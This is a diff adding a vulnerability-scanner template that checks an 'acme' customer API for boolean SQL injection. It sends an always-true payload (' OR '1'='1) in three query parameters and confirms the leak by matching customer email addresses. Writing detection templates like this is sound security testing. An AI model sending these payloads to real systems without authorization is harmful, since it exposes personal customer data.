@@ -1,0 +1,23 @@
+id: acme-sqli-boolean-customers
+info:
+  name: SQL Injection (Boolean, customer data)
+  severity: high
+  tags: [sqli, injection]
+  description: "An always-true SQL predicate in a query parameter returned every customer record."
+  remediation: "Use parameterized queries; never concatenate request values into SQL text."
+  cwe: "CWE-89"
+  owasp: "A03:2021-Injection"
+
+requests:
+  - method: GET
+    paths:
+      - "/api/customers/by-name?name=x%27%20OR%20%271%27%3D%271"
+      - "/api/customers/by-email?email=x%27%20OR%20%271%27%3D%271"
+      - "/api/customers/emails?region=x%27%20OR%20%271%27%3D%271"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["ben@example.test", "chloe@example.test"]
+        condition: and
